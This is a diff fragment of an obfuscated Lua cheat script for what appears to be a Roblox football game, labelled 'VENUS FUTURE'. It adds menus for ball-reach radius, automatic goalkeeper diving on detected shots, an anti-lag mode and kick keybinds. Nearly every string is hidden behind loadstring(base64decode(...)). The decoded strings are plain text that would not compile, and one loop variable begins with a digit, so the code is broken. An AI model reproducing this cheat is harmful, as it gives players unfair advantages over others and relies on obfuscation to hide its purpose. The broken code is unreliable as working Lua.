+    Title = loadstring(base64decode("UmFkaXVzIChzdHVkcyk="))(),
+    Flag = loadstring(base64decode("dmVudXNfYmFsbF9zaXpl"))(),
+    Desc = loadstring(base64decode("QmFsbCByZWFjaCByYWRpdXM="))(),
+    Step = 1,
+    Value = {Min=1, Max=50, Default=14},
+    Callback = function(v) ballReachCFG.size = v end
+})
+TabBall:Divider()
+TabBall:Section({Title=loadstring(base64decode("VmlzdWFs"))()})
+TabBall:Toggle({
+    Title = loadstring(base64decode("SGlkZSBTcGhlcmU="))(),
+    Flag = loadstring(base64decode("dmVudXNfYmFsbF9oaWRl"))(),
+    Desc = loadstring(base64decode("TWFrZSB0aGUgYmFsbCBzcGhlcmUgaW52aXNpYmxl"))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v) ballReachCFG.hide = v end
+})
+TabBall:Slider({
+    Title = loadstring(base64decode("U3BoZXJlIFRyYW5zcGFyZW5jeQ=="))(),
+    Flag = loadstring(base64decode("dmVudXNfYmFsbF90cmFucw=="))(),
+    Desc = loadstring(base64decode("SG93IHZpc2libGUgdGhlIGJhbGwgc3BoZXJlIGlz"))(),
+    Step = 0.05,
+    Value = {Min=0, Max=1, Default=0.6},
+    Callback = function(v) ballReachCFG.transparency = v end
+})
+TabBall:Colorpicker({
+    Title = loadstring(base64decode("U3BoZXJlIENvbG9y"))(),
+    Flag = loadstring(base64decode("dmVudXNfYmFsbF9jb2xvcg=="))(),
+    Desc = loadstring(base64decode("Q29sb3Igb2YgdGhlIGJhbGwgc3BoZXJl"))(),
+    Value = Color3.fromRGB(200,200,210),
+    Callback = function(v) ballReachCFG.color = v end
+})
+TabBall:Divider()
+TabBall:Section({Title=loadstring(base64decode("U3RhdHVz"))()})
+local ballStatusLabel = TabBall:Paragraph({Title=loadstring(base64decode("RGV0ZWN0ZWQgQmFsbA=="))(), Desc=loadstring(base64decode("V2FpdGluZy4uLg=="))()})
+task.spawn(function()
+    while true do
+        task.wait(0.35)
+        local nb = nearestBall
+        local c = p.Character
+        local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        if nb and nb.Parent and hrp then
+            local dist = math.floor((hrp.Position - nb.Position).Magnitude)
+            pcall(function()
+                ballStatusLabel:Set({Desc = loadstring(base64decode("QmFsbCBuZWFyYnkgwrcg"))() .. dist .. loadstring(base64decode("IHN0dWRz"))()})
+            end)
+        else
+            pcall(function()
+                ballStatusLabel:Set({Desc = loadstring(base64decode("Tm8gYmFsbCBkZXRlY3RlZA=="))()})
+            end)
+        end
+    end
+end)
+
+TabCatch:Section({Title=loadstring(base64decode("8J+npCAgQXV0byBDYXRjaCAvIEF1dG8gRGl2ZQ=="))()})
+TabCatch:Paragraph({
+    Title = loadstring(base64decode("SG93IGl0IHdvcmtz"))(),
+    Desc = loadstring(base64decode("RGV0ZWN0cyBpbmNvbWluZyBzaG90cyBhbmQgYXV0b21hdGljYWxseSBkaXZlczpcbuKAoiBMZWZ0ICDihpIgWlxu4oCiIFJpZ2h0IOKGkiBDXG5cbk5vdyByZWFjdHMgbGF0ZXIgYW5kIG9ubHkgb24gcmVhbCBzaG90cy4="))()
+})
+
+TabCatch:Toggle({
+    Title = loadstring(base64decode("RW5hYmxlIEF1dG8gQ2F0Y2g="))(),
+    Flag = loadstring(base64decode("dmVudXNfYXV0b2NhdGNo"))(),
+    Desc = loadstring(base64decode("QXV0b21hdGljYWxseSBkaXZlIHdoZW4gYSByZWFsIHNob3QgaXMgY29taW5n"))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v)
+        autoCatch = v
+        lib:Notify({
+            Title = loadstring(base64decode("VkVOVVM="))(),
+            Content = loadstring(base64decode("QXV0byBDYXRjaCA="))() .. (v and loadstring(base64decode("ZW5hYmxlZA=="))() or loadstring(base64decode("ZGlzYWJsZWQ="))()),
+            Duration = 1.8,
+            Icon = v and loadstring(base64decode("Y2hlY2s="))() or loadstring(base64decode("cG93ZXItb2Zm"))()
+        })
+    end
+})
+
+TabCatch:Slider({
+    Title = loadstring(base64decode("RGV0ZWN0aW9uIFJhbmdl"))(),
+    Flag = loadstring(base64decode("dmVudXNfYXV0b2NhdGNoX3Jhbmdl"))(),
+    Desc = loadstring(base64decode("UmVjb21tZW5kZWQ6IDE0IC0gMTg="))(),
+    Step = 1,
+    Value = {Min = 10, Max = 28, Default = 16},
+    Callback = function(v) autoCatchRange = v end
+})
+
+TabCatch:Divider()
+TabCatch:Section({Title=loadstring(base64decode("RGl2ZSBLZXlz"))()})
+TabCatch:Paragraph({
+    Title = loadstring(base64decode("Q3VycmVudCBLZXlz"))(),
+    Desc = loadstring(base64decode("TGVmdCBEaXZlICDihpIgIFpcblJpZ2h0IERpdmUg4oaSICBD"))()
+})
+
+local removedSkies = {}
+local function enableAntiLag()
+    task.spawn(function()
+        local desc = game:GetDescendants()
+        for 0kXyE4xk = 1, #desc do
+            local v = desc[0kXyE4xk]
+            if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
+                v.Material = Enum.Material.SmoothPlastic
+            elseif v:IsA(loadstring(base64decode("UGFydGljbGVFbWl0dGVy"))()) or v:IsA(loadstring(base64decode("U21va2U="))()) or v:IsA(loadstring(base64decode("U3BhcmtsZXM="))()) or v:IsA(loadstring(base64decode("RmlyZQ=="))()) then
+                v.Enabled = false
+            elseif v:IsA(loadstring(base64decode("Qmxvb21FZmZlY3Q="))()) or v:IsA(loadstring(base64decode("Qmx1ckVmZmVjdA=="))()) or v:IsA(loadstring(base64decode("RGVwdGhPZkZpZWxkRWZmZWN0"))()) or v:IsA(loadstring(base64decode("U3VuUmF5c0VmZmVjdA=="))()) then
+                v.Enabled = false
+            elseif v:IsA(loadstring(base64decode("RGVjYWw="))()) or v:IsA(loadstring(base64decode("VGV4dHVyZQ=="))()) then
+                v.Transparency = 1
+            elseif v:IsA(loadstring(base64decode("U2t5"))()) then
+                removedSkies[#removedSkies + 1] = v
+                v.Parent = nil
+            end
+            if 0kXyE4xk % 250 == 0 then task.wait() end
+        end
+    end)
+    L.FogEnd = math.huge
+    L.FogStart = math.huge
+    L.Ambient = Color3.fromRGB(255,255,255)
+    L.Brightness = 5
+    L.OutdoorAmbient = Color3.fromRGB(255,255,255)
+    lib:Notify({Title=loadstring(base64decode("VkVOVVM="))(), Content=loadstring(base64decode("QW50aS1MYWcgZW5hYmxlZA=="))(), Duration=2, Icon=loadstring(base64decode("emFw"))()})
+end
+
+local function disableAntiLag()
+    L.ClockTime = 14
+    L.Brightness = 2
+    L.GlobalShadows = true
+    L.FogStart = 0
+    L.FogEnd = 100000
+    L.Ambient = Color3.fromRGB(128,128,128)
+    L.OutdoorAmbient = Color3.fromRGB(128,128,128)
+    for _, s in ipairs(removedSkies) do
+        s.Parent = L
+    end
+    removedSkies = {}
+    lib:Notify({Title=loadstring(base64decode("VkVOVVM="))(), Content=loadstring(base64decode("QW50aS1MYWcgZGlzYWJsZWQ="))(), Duration=2, Icon=loadstring(base64decode("cG93ZXItb2Zm"))()})
+end
+
+TabAntiL:Section({Title=loadstring(base64decode("UGVyZm9ybWFuY2U="))()})
+TabAntiL:Paragraph({
+    Title = loadstring(base64decode("SW5mbw=="))(),
+    Desc = loadstring(base64decode("UmVtb3ZlcyB0ZXh0dXJlcywgcGFydGljbGVzIGFuZCBlZmZlY3RzIHRvIGltcHJvdmUgRlBTLg=="))()
+})
+TabAntiL:Toggle({
+    Title = loadstring(base64decode("QW50aS1MYWc="))(),
+    Flag = loadstring(base64decode("dmVudXNfYW50aWxhZw=="))(),
+    Desc = loadstring(base64decode("TG93IHF1YWxpdHkgbW9kZSDigJQgbW9yZSBGUFMsIGxlc3MgdmlzdWFscw=="))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v)
+        if v then enableAntiLag() else disableAntiLag() end
+    end
+})
+TabAntiL:Divider()
+TabAntiL:Section({Title=loadstring(base64decode("U2VydmVy"))()})
+TabAntiL:Paragraph({
+    Title = loadstring(base64decode("UGxheWVycyBpbiBTZXJ2ZXI="))(),
+    Desc = #Players:GetPlayers() .. loadstring(base64decode("Lw=="))() .. Players.MaxPlayers .. loadstring(base64decode("IGNvbm5lY3RlZA=="))()
+})
+
+TabKeys:Section({Title=loadstring(base64decode("S2V5YmluZHM="))()})
+TabKeys:Paragraph({
+    Title = loadstring(base64decode("SG93IHRvIHVzZQ=="))(),
+    Desc = loadstring(base64decode("Q2xpY2sgJ0NoYW5nZScgb24gYW55IGJpbmQsIHRoZW4gcHJlc3MgdGhlIG5ldyBrZXkuIENoYW5nZXMgYXBwbHkgaW5zdGFudGx5Lg=="))()
+})
+TabKeys:Divider()
+
+TabKeys:Section({Title=loadstring(base64decode("TWVudQ=="))()})
+local kbMenuLabel = TabKeys:Paragraph({
+    Title = loadstring(base64decode("T3BlbiAvIENsb3NlIE1lbnU="))(),
+    Desc = loadstring(base64decode("Q3VycmVudCBrZXk6IFsg"))() .. kbName(KB.toggleMenu) .. loadstring(base64decode("IF0="))()
+})
+TabKeys:Button({
+    Title = loadstring(base64decode("Q2hhbmdlIE1lbnUgS2V5"))(),
+    Icon = loadstring(base64decode("bHVjaWRlOmVkaXQtMw=="))(),
+    Desc = loadstring(base64decode("Q2xpY2sgdGhlbiBwcmVzcyB0aGUga2V5IHlvdSB3YW50"))(),
+    Callback = function()
+        pcall(function()
+            kbMenuLabel:Set({Title = loadstring(base64decode("T3BlbiAvIENsb3NlIE1lbnU="))(), Desc = loadstring(base64decode("V2FpdGluZyBmb3Iga2V5Li4u"))()})
+        end)
+        listenNextKey(function(kc)
+            KB.toggleMenu = kc
+            pcall(function()
+                kbMenuLabel:Set({Title = loadstring(base64decode("T3BlbiAvIENsb3NlIE1lbnU="))(), Desc = loadstring(base64decode("Q3VycmVudCBrZXk6IFsg"))() .. kbName(kc) .. loadstring(base64decode("IF0="))()})
+            end)
+            lib:Notify({Title=loadstring(base64decode("S2V5YmluZA=="))(), Content=loadstring(base64decode("TWVudSDihpIg"))() .. kbName(kc), Duration=2, Icon=loadstring(base64decode("Y2hlY2s="))()})
+        end)
+    end
+})
+TabKeys:Divider()
+
+TabKeys:Section({Title=loadstring(base64decode("S2ljayBMZWZ0"))()})
+local kbLeftLabel = TabKeys:Paragraph({
+    Title = loadstring(base64decode("S2ljayBMZWZ0"))(),
+    Desc = loadstring(base64decode("Q3VycmVudCBrZXk6IFsg"))() .. kbName(KB.kickLeft) .. loadstring(base64decode("IF0gIChmaXJlcyBSKQ=="))()
+})
+TabKeys:Button({
+    Title = loadstring(base64decode("Q2hhbmdlIExlZnQgS2ljayBLZXk="))(),
+    Icon = loadstring(base64decode("bHVjaWRlOmVkaXQtMw=="))(),
+    Desc = loadstring(base64decode("Q2xpY2sgdGhlbiBwcmVzcyB0aGUga2V5IHlvdSB3YW50"))(),
+    Callback = function()
+        pcall(function()
+            kbLeftLabel:Set({Title = loadstring(base64decode("S2ljayBMZWZ0"))(), Desc = loadstring(base64decode("V2FpdGluZyBmb3Iga2V5Li4u"))()})
+        end)
+        listenNextKey(function(kc)
+            KB.kickLeft = kc
+            pcall(function()
+                kbLeftLabel:Set({Title = loadstring(base64decode("S2ljayBMZWZ0"))(), Desc = loadstring(base64decode("Q3VycmVudCBrZXk6IFsg"))() .. kbName(kc) .. loadstring(base64decode("IF0gIChmaXJlcyBSKQ=="))()})
+            end)
+            lib:Notify({Title=loadstring(base64decode("S2V5YmluZA=="))(), Content=loadstring(base64decode("S2ljayBMZWZ0IOKGkiA="))() .. kbName(kc), Duration=2, Icon=loadstring(base64decode("Y2hlY2s="))()})
+        end)
+    end
+})
+TabKeys:Divider()
+
+TabKeys:Section({Title=loadstring(base64decode("S2ljayBSaWdodA=="))()})
+local kbRightLabel = TabKeys:Paragraph({
+    Title = loadstring(base64decode("S2ljayBSaWdodA=="))(),
+    Desc = loadstring(base64decode("Q3VycmVudCBrZXk6IFsg"))() .. kbName(KB.kickRight) .. loadstring(base64decode("IF0gIChmaXJlcyBUKQ=="))()
+})
+TabKeys:Button({
+    Title = loadstring(base64decode("Q2hhbmdlIFJpZ2h0IEtpY2sgS2V5"))(),
+    Icon = loadstring(base64decode("bHVjaWRlOmVkaXQtMw=="))(),
+    Desc = loadstring(base64decode("Q2xpY2sgdGhlbiBwcmVzcyB0aGUga2V5IHlvdSB3YW50"))(),
+    Callback = function()
+        pcall(function()
+            kbRightLabel:Set({Title = loadstring(base64decode("S2ljayBSaWdodA=="))(), Desc = loadstring(base64decode("V2FpdGluZyBmb3Iga2V5Li4u"))()})
+        end)
+        listenNextKey(function(kc)
+            KB.kickRight = kc
+            pcall(function()
+                kbRightLabel:Set({Title = loadstring(base64decode("S2ljayBSaWdodA=="))(), Desc = loadstring(base64decode("Q3VycmVudCBrZXk6IFsg"))() .. kbName(kc) .. loadstring(base64decode("IF0gIChmaXJlcyBUKQ=="))()})
+            end)
+            lib:Notify({Title=loadstring(base64decode("S2V5YmluZA=="))(), Content=loadstring(base64decode("S2ljayBSaWdodCDihpIg"))() .. kbName(kc), Duration=2, Icon=loadstring(base64decode("Y2hlY2s="))()})
+        end)
+    end
+})
+
+LOADUI.step(1, loadstring(base64decode("UmVhZHkh"))())
+LOADUI.done()
+Window:Open()
+Window:SelectTab(1)
+lib:Notify({
+    Title = loadstring(base64decode("VkVOVVMgRlVUVVJF"))(),
+    Content = loadstring(base64decode("bmFjaHlwZXJyciAmIEhpaW1wYXVsNTcgfCBDdWV2YSB6dWEgenVhIHwgT3B0aW1pemVkIHZlcnNpb24gcmVhZHkh"))(),
+    Duration = 5,
+    Icon = loadstring(base64decode("c29sYXI6cGxhbmV0LWJvbGQ="))(),
+})
+end
+wRUaZ348(BznEN)
+end)(...)
